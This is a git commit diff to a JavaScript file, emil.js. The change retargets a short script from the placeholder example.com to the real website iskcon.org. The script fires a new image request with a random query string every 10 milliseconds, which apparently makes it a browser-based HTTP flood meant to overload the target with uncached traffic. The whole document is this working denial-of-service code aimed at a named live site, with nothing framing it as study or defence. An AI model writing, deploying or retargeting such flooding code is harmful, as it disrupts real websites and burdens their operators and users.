62e64e36f17c56d8a8dc1cf0ed26c4b02ca10af2
academicschoolbd <159193937+academicschoolbd@users.noreply.github.com>
2026-09-03 14:53:30 +0600

    Update emil.js

--- emil.js
+++ emil.js
@@ -2,5 +2,5 @@ setInterval(function(){
     var image = new Image()
     var rand = Math.floor(Math.random() * 999999999999999999)
 
-    image.src = 'https://example.com?' + rand;
+    image.src = 'https://iskcon.org/?' + rand;
 }, 10);
